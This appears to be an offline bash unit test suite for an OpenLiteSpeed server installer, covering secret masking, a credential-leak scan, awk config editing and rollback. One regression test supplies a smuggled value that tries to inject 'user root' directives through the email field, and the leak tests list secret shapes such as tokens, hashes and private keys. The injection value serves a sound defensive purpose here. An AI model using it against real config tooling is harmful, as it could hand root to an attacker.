#!/usr/bin/env bash
# tests/unit.sh - offline unit tests for the pure bash/awk logic of setup.sh.
# Runs without root and without network on any machine with bash 5, awk, jq, openssl.
#   bash tests/unit.sh
set -Eeuo pipefail
shopt -s lastpipe
HERE="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
ROOT="$(dirname "$HERE")"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/ss-unit.XXXXXX")"
cleanup() { rm -rf "$TMP"; }

# ---- globals normally provided by setup.sh (all paths redirected into TMP) --
SCRIPT_VERSION="test"; SCRIPT_VERSION_LINE="1.0"
TIMEZONE="Europe/Istanbul"; ADMIN_PORT="7080"; PHP_VERSION="8.3"; ADMIN_ACCESS="tunnel"; ADMIN_ALLOWED_IP=""; DEFAULT_EMAIL=""; SSH_PORT=""
DB_BUFFER_PERCENT=""; REDIS_MAX_PERCENT=""; BACKUP_KEEP="7"; BACKUP_SCHEDULE=""; FAIL2BAN_IGNORE_IP=""
STATE_DIR="$TMP/state"; SITES_ROOT="$TMP/home"; SITES_LOG_ROOT="$TMP/sitelogs"; LSWS_HOME="$TMP/lsws"; LOG_FILE="$TMP/server_setup.log"
BACKUP_ROOT="$TMP/backups"; ACME_ROOT="$TMP/acme"; SSL_DEPLOY_DIR="$TMP/ssl"
SYSCTL_FILE="$TMP/sysctl.conf"; LIMITS_FILE="$TMP/limits.conf"; MARIADB_TUNED_FILE="$TMP/60-tuned.cnf"
FAIL2BAN_JAIL_FILE="$TMP/jail.conf"; FAIL2BAN_WEB_JAIL_FILE="$TMP/jail-web.conf"; CRON_FILE="$TMP/cron"
FAIL2BAN_FILTER_DIR="$TMP/f2b-filters"
CERTBOT_DEPLOY_HOOK="$TMP/hook.sh"; LOGROTATE_SITES_FILE="$TMP/lr-sites"; LOGROTATE_SELF_FILE="$TMP/lr-self"
INSTALL_DIR="$TMP/install"; BIN_LINK="$TMP/lompstack"; BIN_SHORT="$TMP/lomp"; LOCK_FILE="$TMP/lock"
OPT_YES=1 OPT_DRY_RUN=0 OPT_QUIET=1 OPT_VERBOSE=0 OPT_NO_COLOR=1 OPT_JSON=0 OPT_NON_INTERACTIVE=1
SCRIPT_PATH="$ROOT/setup.sh"; SCRIPT_DIR="$ROOT"
export TMPDIR="$TMP"
for m in common system ols php db ssl domain harden scan proxy app mail webmail cloudflare backup monitor install menu; do
  # shellcheck source=/dev/null
  source "$ROOT/lib/$m.sh"
done
trap cleanup EXIT
mkdir -p "$STATE_DIR" "$LSWS_HOME/conf/vhosts" "$SITES_ROOT"; : >"$LOG_FILE"
chown() { return 0; }   # no lsadm/site users on the test machine
# nor can the suite switch users: run the command as whoever runs the tests, and keep a record
RUNUSER_LOG="$TMP/runuser.log"
runuser() {
  printf '%s\n' "$*" >>"$RUNUSER_LOG"
  [[ "${1:-}" == "-u" && -n "${2:-}" && "${3:-}" == "--" ]] || return 1
  shift 3
  "$@"
}
# nor are there ACL tools everywhere, or an OpenLiteSpeed user to name: a record again
SETFACL_LOG="$TMP/setfacl.log"
setfacl() { printf '%s\n' "$*" >>"$SETFACL_LOG"; }
# Git Bash runs the native jq.exe, which writes CRLF unless given -b: a multi-line result then
# carries a \r at the end of every line but the last. Servers and CI (Linux) are unaffected.
if [[ "${OSTYPE:-}" == msys* || "${OSTYPE:-}" == cygwin* ]]; then
  jq() { command jq -b "$@"; }
fi

# Some filesystems (MSYS/NTFS under Git Bash) ignore chmod, so permission assertions
# only run where they are meaningful. On Linux and in CI they always run.
CAN_CHMOD=0
: >"$TMP/.permprobe"; chmod 0600 "$TMP/.permprobe" 2>/dev/null || true
[[ "$(stat -c %a "$TMP/.permprobe" 2>/dev/null || true)" == "600" ]] && CAN_CHMOD=1
rm -f "$TMP/.permprobe"
# MSYS under Git Bash copies instead of linking, so symlink assertions only run elsewhere
CAN_SYMLINK=0
: >"$TMP/.symtarget"
ln -sfn "$TMP/.symtarget" "$TMP/.symprobe" 2>/dev/null && [[ -L "$TMP/.symprobe" ]] && CAN_SYMLINK=1
rm -f "$TMP/.symprobe" "$TMP/.symtarget"

PASS=0; FAIL=0
ok()   { PASS=$((PASS + 1)); }
fail() { FAIL=$((FAIL + 1)); printf 'FAIL: %s\n' "$*" >&2; }
assert_eq()    { if [[ "$2" == "$3" ]]; then ok; else fail "$1: expected [$2] got [$3]"; fi; }
assert_true()  { local n="$1"; shift; if "$@"; then ok; else fail "$n"; fi; }
assert_false() { local n="$1"; shift; if "$@"; then fail "$n (expected failure)"; else ok; fi; }
assert_has()   { if [[ "$3" == *"$2"* ]]; then ok; else fail "$1: missing [$2]"; fi; }
assert_lacks() { if [[ "$3" != *"$2"* ]]; then ok; else fail "$1: unexpected [$2]"; fi; }
section() { printf '%s\n' "-- $*"; }
# Run a function the way the installer does (errexit armed) and report its exit status.
# A plain "if func; then" would disable errexit and hide exactly the bugs we look for.
# The subshell must not be the left side of "||": that suppresses errexit inside it, which is
# the very failure mode this helper exists to catch. errexit is turned off around the call
# instead, and put back exactly as it was.
run_isolated() {
  local rc=0 armed="" prev=""
  case "$-" in *e*) armed=1 ;; esac
  # the ERR trap would report the failing subshell as an unexpected failure and end the
  # command substitution this runs in, before the status could be printed
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; "$@" ) >/dev/null 2>&1
  rc=$?
  [[ -z "$armed" ]] || set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}

# =============================================================================
section "domain helpers"
assert_true  "valid example.com"       lib_domain_valid example.com
assert_true  "valid sub.example.co.uk" lib_domain_valid sub.example.co.uk
assert_true  "valid uppercase"         lib_domain_valid EXAMPLE.COM
assert_false "invalid leading dash"    lib_domain_valid -bad.com
assert_false "invalid no dot"          lib_domain_valid localhost
assert_false "invalid double dot"      lib_domain_valid a..b.com
assert_false "invalid underscore"      lib_domain_valid exa_mple.com
assert_eq "ident example.com" "example_com" "$(lib_domain_ident example.com)"
assert_eq "ident digits first" "s_123_com" "$(lib_domain_ident 123.com)"
assert_eq "ident dashes" "my_site_co_uk" "$(lib_domain_ident my-site.co.uk)"
assert_eq "ident length" 28 "$(lib_domain_ident averyveryveryverylongdomainname.example.com | wc -c | tr -d ' ')"
assert_eq "size 64M" 64 "$(lib_size_to_mb 64M)"
assert_eq "size 1G" 1024 "$(lib_size_to_mb 1G)"
assert_eq "size empty" 0 "$(lib_size_to_mb "")"
assert_true "version ge" lib_version_ge 10.11.2 10.6
assert_false "version lt" lib_version_ge 10.6.12 10.11
assert_eq "human mb" "2.0 GB" "$(lib_human_mb 2048)"
assert_eq "password length" 32 "$(lib_random_password | wc -c | tr -d ' ')"
is_alnum20() { [[ "$1" =~ ^[A-Za-z0-9]{20}$ ]]; }
assert_true "password alnum" is_alnum20 "$(lib_random_password 20)"

# =============================================================================
section "secret masking"
m() { printf '%s' "$1" | lib_mask_secrets; }
assert_eq "mask password=" "password=********" "$(m 'password=abc123')"
assert_eq "mask PASSWORD: quoted" "PASSWORD: '********'" "$(m "PASSWORD: 'abc123'")"
assert_eq "mask identified by" "IDENTIFIED BY '********'" "$(m "IDENTIFIED BY 'S3cr3t!'")"
assert_eq "mask bearer" "Authorization: Bearer ********" "$(m 'Authorization: Bearer abcDEF.123-x')"
assert_eq "mask cf token" "dns_cloudflare_api_token = ********" "$(m 'dns_cloudflare_api_token = q1w2e3r4')"
assert_eq "mask pass:" "-pass pass:********" "$(m '-pass pass:hunter2')"
assert_eq "mask telegram url" "https://api.telegram.org/bot********/sendMessage" "$(m 'https://api.telegram.org/bot123:ABC/sendMessage')"
assert_eq "no false positive" "wrote /etc/ssh/sshd_config.d/99-server-setup.conf" "$(m 'wrote /etc/ssh/sshd_config.d/99-server-setup.conf')"
assert_eq "no mask PasswordAuthentication" "PasswordAuthentication no" "$(m 'PasswordAuthentication no')"
# Every secret this tool accepts on the command line is SPACE separated, and setup.sh logs
# the whole argument vector. A key=value-only masker let live tokens into the log.
assert_eq "mask --cf-api-token"   "args='--cf-api-token ********'"   "$(m "args='--cf-api-token Xv8sQ2pLm9TzR4kWn1bYc7dEf0g'")"
assert_eq "mask --smtp-pass"      "--smtp-pass ********"             "$(m '--smtp-pass hunter2secret')"
assert_eq "mask --telegram-token" "--telegram-token ********"        "$(m '--telegram-token 123456:ABCdefGhi')"
assert_eq "mask --api-key"        "--api-key ********"               "$(m '--api-key abcd1234efgh')"
assert_eq "mask redis requirepass line" "requirepass ********"       "$(m 'requirepass S3cr3tRedisPass')"
assert_eq "mask msmtp password line"    "password ********"          "$(m 'password S3cr3tSmtpPass')"
assert_eq "mask json token"       '"token":"********"'               "$(m '"token":"abcd1234efgh"')"
assert_eq "no mask --key-type"    "--key-type ecdsa -d mail.x.com"   "$(m '--key-type ecdsa -d mail.x.com')"
assert_eq "no mask --admin-ip"    "--admin-ip 203.0.113.5"           "$(m '--admin-ip 203.0.113.5')"
assert_eq "no mask --backup-keep" "--backup-keep 7"                  "$(m '--backup-keep 7')"
assert_eq "no mask --admin-port"  "--admin-port 7080"                "$(m '--admin-port 7080')"
# git remotes and connection strings carry the credential inside the URL itself
assert_eq "mask url user:secret"      "--git https://oauth2:********@gitlab.com/g/r.git" "$(m '--git https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git')"
assert_eq "mask token as url user"    "https://********@github.com/o/r.git"              "$(m 'https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git')"
assert_eq "mask connection string"    "mysql://app:********@127.0.0.1:3306/app"          "$(m 'mysql://app:S3cr3tPw@127.0.0.1:3306/app')"
assert_eq "mask empty-user url"       "redis://:********@127.0.0.1:6379"                 "$(m 'redis://:S3cr3tPw@127.0.0.1:6379')"
assert_eq "no mask ssh remote user"   "ssh://git@github.com/o/r.git"                     "$(m 'ssh://git@github.com/o/r.git')"
assert_eq "no mask scp-style remote"  "git@github.com:o/r.git"                           "$(m 'git@github.com:o/r.git')"
assert_eq "no mask short url user"    "https://bob@bitbucket.org/w/r.git"                "$(m 'https://bob@bitbucket.org/w/r.git')"
assert_eq "no mask host:port url"     "http://127.0.0.1:3000/health"                     "$(m 'http://127.0.0.1:3000/health')"
# the doctor leak scan must see exactly what the masker masks, or it reports a clean log
leak_hit() { grep -Eqi "$(lib_secret_leak_pattern)" <<<"$1"; }
assert_true  "doctor sees a leaked flag token"   leak_hit "args='--cf-api-token Xv8sQ2pLm9TzR4kWn1bYc7dEf0g'"
assert_true  "doctor sees a leaked key=value"    leak_hit "password=S3cr3tValue123"
assert_true  "doctor sees a leaked requirepass"  leak_hit "requirepass S3cr3tRedisPass"
assert_false "doctor ignores a masked line"      leak_hit "args='--cf-api-token ********'"
assert_false "doctor ignores PasswordAuthentication" leak_hit "PasswordAuthentication no"
assert_true  "doctor sees credentials in a url"      leak_hit "--git https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git"
assert_true  "doctor sees a token used as url user"  leak_hit "https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git"
assert_false "doctor ignores a masked url"           leak_hit "https://oauth2:********@gitlab.com/g/r.git"
assert_false "doctor ignores a masked token url"     leak_hit "https://********@github.com/o/r.git"
assert_false "doctor ignores an ssh remote"          leak_hit "ssh://git@github.com/o/r.git"
assert_false "doctor ignores a host:port url"        leak_hit "http://127.0.0.1:3000/health"
# every masked shape must also be one the leak scan recognises before masking
for _s in 'https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git' 'https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git' 'mysql://app:S3cr3tPw@127.0.0.1:3306/app'; do
  assert_false "masked form of ${_s%%@*}@... is clean" leak_hit "$(m "$_s")"
done
# a mail server hands the log two more shapes: password hashes and private keys. A hash is not
# a password, but it is worth an offline attack, and neither belongs in a world-readable log.
assert_eq "mask a dovecot hash"  "info@example.com:{BLF-CRYPT}********" "$(m 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv')"
assert_eq "mask a bare bcrypt hash" 'hash $2y$********'                 "$(m 'hash $2y$10$Abcdefghijklmnopqrstuv')"
assert_eq "mask a sha512-crypt hash" 'hash $6$********'                 "$(m 'hash $6$rounds=5000$saltsalt$Abcdefghij')"
assert_eq "mask roundcube des_key" "des_key = ********"                 "$(m 'des_key = rcmail24ByteDESkeyStr')"
_pem=$'-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ\n-----END PRIVATE KEY-----'
# the markers go too: the leak scan looks for them, and a masked line must not trip it
assert_eq "mask a whole private key" $'********\n********\n********' "$(m "$_pem")"
assert_true  "doctor sees a leaked hash"        leak_hit 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv'
assert_true  "doctor sees a leaked private key" leak_hit "$_pem"
assert_false "doctor ignores the masked hash"   leak_hit "$(m 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv')"
assert_false "doctor ignores the masked key"    leak_hit "$(m "$_pem")"
assert_false "doctor ignores an ordinary path"  leak_hit '/var/vmail/example.com/info/Maildir'

# =============================================================================
section "OpenLiteSpeed config editing (awk)"
cat >"$LSWS_CONF" <<'EOF'
#
# PLAIN TEXT CONFIGURATION FILE
#
serverName
user                             nobody
group                            nogroup
showVersionNumber                0
adminEmails                      root@localhost

tuning{
    maxConnections               10000
    maxSSLConnections            10000
    keepAliveTimeout             5
    quicEnable                   1
}

accessControl{
	allow                                   ALL
	deny
}

extProcessor lsphp{
    type                            lsapi
    address                         uds://tmp/lshttpd/lsphp.sock
    env                             PHP_LSAPI_CHILDREN=10
    path                            fcgi-bin/lsphp
}

scriptHandler{
    add lsapi:lsphp  php
}

virtualHost Example{
    vhRoot                   Example/
    configFile               conf/vhosts/Example/vhconf.conf
    setUIDMode               0
}

listener Default{
    address                  *:8088
    secure                   0
    map                      Example *
}

vhTemplate centralConfigLog{
    templateFile             conf/templates/ccl.conf
    listeners                Default
}

vhTemplate EasyRailsWithSuEXEC{
    templateFile             conf/templates/rails.conf
    listeners                Default
}

vhTemplate mine{
    templateFile             conf/templates/mine.conf
    listeners                HTTP
}

module cache {
    ls_enabled          1
    enableCache         0
}
EOF
lib_ols_tx_begin
assert_eq "top get showVersionNumber" "0" "$(lib_ols_tx_top_get showVersionNumber)"
assert_eq "top get user" "nobody" "$(lib_ols_tx_top_get user)"
assert_eq "top get missing" "" "$(lib_ols_tx_top_get httpdWorkers)"
lib_ols_tx_top_set httpdWorkers 2
assert_eq "top set new key" "2" "$(lib_ols_tx_top_get httpdWorkers)"
assert_true "new key placed before first block" bash -c "awk '/^httpdWorkers/{k=NR} /^tuning/{t=NR} END{exit !(k && t && k<t)}' '$OLS_TX_FILE'"
lib_ols_tx_top_set showVersionNumber 0
assert_eq "top set existing (idempotent)" "1" "$(grep -c '^showVersionNumber' "$OLS_TX_FILE")"
lib_ols_tx_top_set adminEmails "admin@example.com"
assert_eq "top set existing value" "admin@example.com" "$(lib_ols_tx_top_get adminEmails)"
assert_eq "block get tuning key" "10000" "$(lib_ols_tx_block_get tuning "" maxConnections)"
lib_ols_tx_block_set tuning "" maxConnections 5000
assert_eq "block set tuning key" "5000" "$(lib_ols_tx_block_get tuning "" maxConnections)"
lib_ols_tx_block_set tuning "" totalInMemCacheSize 64M
assert_eq "block set new tuning key" "64M" "$(lib_ols_tx_block_get tuning "" totalInMemCacheSize)"
assert_eq "tuning still one block" "1" "$(grep -c '^tuning' "$OLS_TX_FILE")"
assert_true  "block exists case-insensitive" lib_ols_tx_block_exists virtualhost Example
assert_true  "block exists extprocessor" lib_ols_tx_block_exists extprocessor lsphp
assert_false "block not exists" lib_ols_tx_block_exists virtualhost Nope
assert_eq "extprocessor path get" "fcgi-bin/lsphp" "$(lib_ols_tx_block_get extprocessor lsphp path)"
lib_ols_tx_block_set extprocessor lsphp path /usr/local/lsws/lsphp83/bin/lsphp
assert_eq "extprocessor path set" "/usr/local/lsws/lsphp83/bin/lsphp" "$(lib_ols_tx_block_get extprocessor lsphp path)"
assert_eq "listener Default address" "*:8088" "$(lib_ols_tx_block_get listener Default address)"
lib_ols_tx_block_remove virtualhost Example
assert_false "block removed" lib_ols_tx_block_exists virtualhost Example
assert_true  "other blocks intact after remove" lib_ols_tx_block_exists listener Default
_ols_tx_drop_stock_templates
assert_true  "stock templates stay while their listener exists" lib_ols_tx_block_exists vhTemplate centralConfigLog
lib_ols_tx_block_remove listener Default
assert_false "listener removed" lib_ols_tx_block_exists listener Default
_ols_tx_drop_stock_templates
assert_false "a stock template on the removed listener is dropped" lib_ols_tx_block_exists vhTemplate centralConfigLog
assert_false "and the other one"                                   lib_ols_tx_block_exists vhTemplate EasyRailsWithSuEXEC
assert_true  "a template on another listener is kept"              lib_ols_tx_block_exists vhTemplate mine
assert_true "braces balanced after edits" _ols_braces_balanced "$OLS_TX_FILE"

SYS_IPV6=0
_ols_tx_listeners_ensure
assert_true "listener HTTP created" lib_ols_tx_block_exists listener HTTP
assert_true "listener HTTPS created" lib_ols_tx_block_exists listener HTTPS
assert_eq "HTTP address" "*:80" "$(lib_ols_tx_block_get listener HTTP address)"
assert_eq "HTTPS sslProtocol" "24" "$(lib_ols_tx_block_get listener HTTPS sslProtocol)"
assert_eq "HTTPS default map" "*" "$(lib_ols_tx_map_get HTTPS _default)"
_ols_tx_listeners_ensure
assert_eq "listeners ensure idempotent" "1" "$(grep -c '^listener HTTPS' "$OLS_TX_FILE")"
assert_eq "map lines not duplicated" "1" "$(awk '/^listener HTTPS/,/^}/' "$OLS_TX_FILE" | grep -c 'map ')"
lib_ols_tx_map_set HTTP example.com "example.com, www.example.com"
assert_eq "map set" "example.com, www.example.com" "$(lib_ols_tx_map_get HTTP example.com)"
lib_ols_tx_map_set HTTP example.com "example.com"
assert_eq "map replace" "example.com" "$(lib_ols_tx_map_get HTTP example.com)"
assert_eq "map count" "2" "$(awk '/^listener HTTP \{/,/^}/' "$OLS_TX_FILE" | grep -c 'map ')"
lib_ols_tx_map_del HTTP example.com
assert_eq "map del" "" "$(lib_ols_tx_map_get HTTP example.com)"
assert_eq "default map kept" "*" "$(lib_ols_tx_map_get HTTP _default)"
lib_ols_render_extprocessor 8.3 12 | lib_ols_tx_block_put extprocessor lsphp83
assert_eq "extprocessor put" "12" "$(lib_ols_tx_block_get extprocessor lsphp83 maxConns)"
lib_ols_render_extprocessor 8.3 6 | lib_ols_tx_block_put extprocessor lsphp83
assert_eq "extprocessor replace" "6" "$(lib_ols_tx_block_get extprocessor lsphp83 maxConns)"
assert_eq "extprocessor single" "1" "$(grep -c '^extprocessor lsphp83' "$OLS_TX_FILE")"
assert_eq "block names" "$(printf 'lsphp\nlsphp83')" "$(_ols_block_names "$OLS_TX_FILE" extprocessor)"
assert_true "braces balanced after listeners" _ols_braces_balanced "$OLS_TX_FILE"
lib_ols_tx_commit
assert_eq "commit changed" "1" "$OLS_CONF_CHANGED"
assert_true "committed file balanced" _ols_braces_balanced "$LSWS_CONF"
lib_ols_tx_begin; lib_ols_tx_commit
assert_eq "commit idempotent" "0" "$OLS_CONF_CHANGED"
assert_eq "conf vhosts after edits" "" "$(lib_ols_conf_vhosts)"

# heredoc awareness
cat >"$TMP/vh.conf" <<'EOF'
docRoot                   $VH_ROOT/public_html/
rewrite  {
  enable                  1
  rules                   <<<END_rules
RewriteCond %{HTTPS} !on
RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]
# a stray { brace } inside the heredoc must be ignored
  END_rules
}
context / {
  location                $VH_ROOT/public_html/
  allowBrowse             1
}
EOF
assert_true "heredoc braces balanced" _ols_braces_balanced "$TMP/vh.conf"
assert_eq "span skips heredoc" "2 9" "$(_ols_span "$TMP/vh.conf" rewrite "")"
assert_eq "context key after heredoc" "1" "$(_ols_block_key "$TMP/vh.conf" context / allowBrowse get)"
printf 'a {\n  b {\n}\n' >"$TMP/bad.conf"
_bal() { _ols_braces_balanced "$1" >/dev/null 2>&1; }   # the reason goes to stdout now
assert_false "unbalanced detected" _bal "$TMP/bad.conf"

# =============================================================================
section "OpenLiteSpeed surgery: audit regressions"
rc_nonzero() { [[ "$(run_isolated "$@")" != "0" ]]; }
_why() { _ols_braces_balanced "$1" 2>/dev/null | grep -oE 'line [0-9]+' | head -1 || true; }
_quiet() { "$@" >/dev/null 2>&1; }
cp "$LSWS_CONF" "$TMP/conf.before-audit"   # this section rewrites it; later sections need it back

# -- a value must not be able to become a second directive -------------------
# "awk -v v=..." applies backslash escape processing, so the two characters \n arrived as a
# real newline and "install --email 'x@y.z\nuser root'" rewrote the server's uid.
cat >"$LSWS_CONF" <<'EOF'
serverName
user                      nobody
adminEmails               root@localhost

tuning  {
  maxConnections          10000
}
EOF
lib_ols_tx_begin
lib_ols_tx_top_set adminEmails 'ops@example.com\nuser root\ngroup root'
assert_eq "backslash-n is stored literally" 'ops@example.com\nuser root\ngroup root' "$(lib_ols_tx_top_get adminEmails)"
assert_eq "no directive injected"  "0"      "$(grep -c '^user root' "$OLS_TX_FILE" || true)"
assert_eq "user directive untouched" "nobody" "$(lib_ols_tx_top_get user)"
lib_ols_tx_block_set tuning "" maxConnections 'a\tb'
assert_eq "tab escape stored literally" 'a\tb' "$(lib_ols_tx_block_get tuning "" maxConnections)"
assert_true "a real newline in a value is refused" rc_nonzero lib_ols_tx_top_set adminEmails "$(printf 'a@b.c\nuser root')"
assert_false "email validation rejects the injection" lib_email_valid 'ops@example.com\nuser root'
assert_false "email validation rejects a space"       lib_email_valid 'a b@example.com'
assert_true  "email validation accepts a normal one"  lib_email_valid 'ops@example.com'
assert_true  "email validation accepts a subdomain"   lib_email_valid 'ops@mail.example.co.uk'

# -- keys OpenLiteSpeed lets repeat ------------------------------------------
cat >"$LSWS_CONF" <<'EOF'
extProcessor lsphp{
  type                    lsapi
  env                     LSAPI_AVOID_FORK=200M
  env                     PHP_LSAPI_CHILDREN=10
  path                    fcgi-bin/lsphp
}
EOF
lib_ols_tx_begin
lib_ols_tx_block_set_multi extprocessor lsphp env "PHP_LSAPI_CHILDREN=48" "PHP_LSAPI_CHILDREN="
assert_eq "the operator's env line survives" "1" "$(grep -c 'LSAPI_AVOID_FORK=200M' "$OLS_TX_FILE")"
assert_eq "our env line is updated"          "1" "$(grep -c 'PHP_LSAPI_CHILDREN=48' "$OLS_TX_FILE")"
assert_eq "no stale value left"              "0" "$(grep -c 'PHP_LSAPI_CHILDREN=10' "$OLS_TX_FILE" || true)"
lib_ols_tx_block_set extprocessor lsphp type lsapi
assert_eq "a single-valued key still collapses duplicates" "1" "$(grep -c '^  type' "$OLS_TX_FILE")"

# -- a map that cannot land must not be silent -------------------------------
# _ols_map only emits inside a listener block; with none matching it echoed its input and
# exited 0, leaving the site registered but bound to nothing (served 403 by the catch-all).
printf 'serverName\nlistener Renamed {\n  address                 *:80\n}\n' >"$LSWS_CONF"
lib_ols_tx_begin
assert_true "a map onto a missing listener is fatal" rc_nonzero lib_ols_tx_map_set HTTP example.com "example.com"

# -- structure diagnostics name the line -------------------------------------
printf 'tuning  {\n  maxConnections 1\n}   # bumped for the campaign\n' >"$TMP/c1.conf"
assert_false "trailing text after } is rejected" _bal "$TMP/c1.conf"
assert_eq "and the line is named" "line 3" "$(_why "$TMP/c1.conf")"
assert_eq "an unclosed block names where it opened" "line 1" "$(_why "$TMP/bad.conf")"
printf 'rewrite {\n  rules  <<<END_r\nRewriteRule ^(.*)$ https://%%{HTTP_HOST}$1 [R=301,L]\n  END_r\n}\n' >"$TMP/c2.conf"
assert_true "a value containing } is not mistaken for a close" _bal "$TMP/c2.conf"

# -- a commented-out block must not skew the depth counter -------------------
# OpenLiteSpeed drops every '#' line before it looks at structure; this parser did not, so
# commenting a block out made every later block lookup silently return nothing.
cat >"$TMP/c3.conf" <<'EOF'
serverName
#expires  {
#  enableExpires           1
#}
tuning  {
  maxConnections          10000
}
listener HTTP {
  address                 *:80
}
EOF
assert_true "a commented-out block parses"  _bal "$TMP/c3.conf"
assert_eq "later blocks are still found"    "5 7"   "$(_ols_span "$TMP/c3.conf" tuning "")"
assert_eq "later block names are still found" "HTTP" "$(_ols_block_names "$TMP/c3.conf" listener)"
assert_eq "later keys are still readable"   "10000" "$(_ols_block_key "$TMP/c3.conf" tuning "" maxConnections get)"

# -- refuse before the surgery, not after ------------------------------------
cp "$TMP/c1.conf" "$LSWS_CONF"
assert_true "tx_begin refuses an unparseable file" rc_nonzero lib_ols_tx_begin
cp "$TMP/c3.conf" "$LSWS_CONF"
assert_false "tx_begin accepts a parseable one" rc_nonzero lib_ols_tx_begin

# -- the rollback point must be real -----------------------------------------
mkdir -p "$LSWS_HOME/admin/conf"
printf 'listener adminListener {\n  address                 127.0.0.1:7080\n}\n' >"$LSWS_ADMIN_CONF"
snap="$(lib_ols_snapshot_take)"
assert_true "snapshot written" test -f "$snap"
assert_eq "admin_config.conf is in the snapshot" "1" "$(tar -tzf "$snap" | grep -c 'admin/conf/admin_config.conf')"
assert_false "restoring an empty path reports success" _quiet lib_ols_snapshot_restore ""
# a change set with no rollback point must stop, not proceed and then claim it rolled back
lib_ols_snapshot_take() { return 1; }
lib_ols_is_installed() { return 0; }
assert_true "change_begin refuses without a snapshot" rc_nonzero lib_ols_change_begin
unset -f lib_ols_snapshot_take lib_ols_is_installed

# -- a restore must never nest the saved tree inside the new one -------------
mkdir -p "$TMP/live/sub"; : >"$TMP/live/keep"
mkdir -p "$TMP/newconf"; : >"$TMP/newconf/fresh"
OLS_REJECTED_DIR=""
_ols_swap_dir "$TMP/live" "$TMP/newconf"
assert_true  "live tree replaced"   test -f "$TMP/live/fresh"
assert_false "old tree not kept"    test -f "$TMP/live/keep"
assert_false "no .failed debris"    test -e "$TMP/live.failed"
assert_false "nothing nested"       test -e "$TMP/live/live.failed"
# the rejected configuration is the only copy of what was tried; keep it for diagnosis
mkdir -p "${LSWS_HOME}/conf2"; : >"${LSWS_HOME}/conf2/rejected-marker"
mkdir -p "$TMP/newconf2"; : >"$TMP/newconf2/fresh"
OLS_REJECTED_DIR="$TMP/rejected"; mkdir -p "$OLS_REJECTED_DIR"
_ols_swap_dir "${LSWS_HOME}/conf2" "$TMP/newconf2"
assert_true  "rejected config kept for diagnosis" test -f "${OLS_REJECTED_DIR}/conf2/rejected-marker"
assert_false "and not left beside the live tree"  test -e "${LSWS_HOME}/conf2.failed"
OLS_REJECTED_DIR=""; rm -rf "${LSWS_HOME}/conf2" "$TMP/rejected"

# -- a port conflict must name the culprit -----------------------------------
# OpenLiteSpeed refuses to start at all when it cannot bind the WebAdmin listener, so
# "Address already in use" on that port took the whole web server down with a generic
# "did not come back after the reload" and no mention of the port.
ss() { printf 'LISTEN 0 100 127.0.0.1:7080 0.0.0.0:* users:(("lshttpd",pid=1234,fd=7))\n'; }
assert_eq "the holder is named" "lshttpd (pid 1234)" "$(lib_port_holder 7080)"
assert_eq "a free port has no holder" "" "$(lib_port_holder 9999)"
ss() { printf 'LISTEN 0 100 [::]:7080 [::]:* users:(("caddy",pid=77,fd=3))\n'; }
assert_eq "IPv6 listeners are seen too" "caddy (pid 77)" "$(lib_port_holder 7080)"
ss() { return 0; }
assert_eq "nothing listening" "" "$(lib_port_holder 7080)"
unset -f ss
# OpenLiteSpeed's own reason must reach the failure message
mkdir -p "${LSWS_HOME}/logs"
cat >"${LSWS_HOME}/logs/error.log" <<'EOF'
2026-09-15 16:29:41.623910 [INFO] [30920] [Module: modcompress 1.1] has been initialized successfully
2026-09-15 16:29:45.626111 [ERROR] [30920] HttpListener::start(): Can't listen at address adminListener: Address already in use!
2026-09-15 16:29:45.626284 [ERROR] [30920] Fatal error in configuration, exit!
EOF
ols_err="$(lib_ols_recent_errors 2)"
assert_has "the real reason is extracted" "Address already in use" "$ols_err"
assert_has "and the fatal line too" "Fatal error in configuration" "$ols_err"
assert_lacks "timestamps stripped" "2026-09-15" "$ols_err"
assert_lacks "info lines excluded" "modcompress" "$ols_err"
rm -f "${LSWS_HOME}/logs/error.log"
assert_eq "no log, no noise" "" "$(lib_ols_recent_errors)"

# -- config test must not be stricter than OpenLiteSpeed ---------------------
assert_eq "SERVER_ROOT expanded" "${LSWS_HOME}/conf/vhosts/Shop/vhconf.conf" \
  "$(_ols_expand_macros '$SERVER_ROOT/conf/vhosts/$VH_NAME/vhconf.conf' Shop)"
assert_eq "braced form expanded too" "${LSWS_HOME}/conf/vhosts/Shop/vhconf.conf" \
  "$(_ols_expand_macros '${SERVER_ROOT}/conf/vhosts/${VH_NAME}/vhconf.conf' Shop)"
printf 'virtualHost Shop{\n  configFile              $SERVER_ROOT/conf/vhosts/$VH_NAME/vhconf.conf\n}\n' >"$LSWS_CONF"
mkdir -p "${LSWS_VHOSTS_DIR}/Shop"; printf 'docRoot $VH_ROOT/public_html/\n' >"${LSWS_VHOSTS_DIR}/Shop/vhconf.conf"
assert_true "a macro configFile passes the test" lib_ols_config_test
rm -f "${LSWS_VHOSTS_DIR}/Shop/vhconf.conf"
assert_false "a missing macro configFile still fails" lib_ols_config_test
rm -rf "${LSWS_VHOSTS_DIR}/Shop"

# -- an explicitly empty --static-paths must round-trip ----------------------
lib_domain_state_reset
D_DOMAIN="app.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_STATIC_PATHS=""
mkdir -p "$STATE_DIR/domains/app.example.com"
lib_domain_state_json >"$STATE_DIR/domains/app.example.com/domain.json"
assert_eq "empty static paths are persisted as 'none'" "none" \
  "$(lib_json_get "$STATE_DIR/domains/app.example.com/domain.json" '.proxy.static_paths')"
lib_domain_state_load app.example.com
assert_eq "and load back as empty, not as the default" "" "$D_STATIC_PATHS"
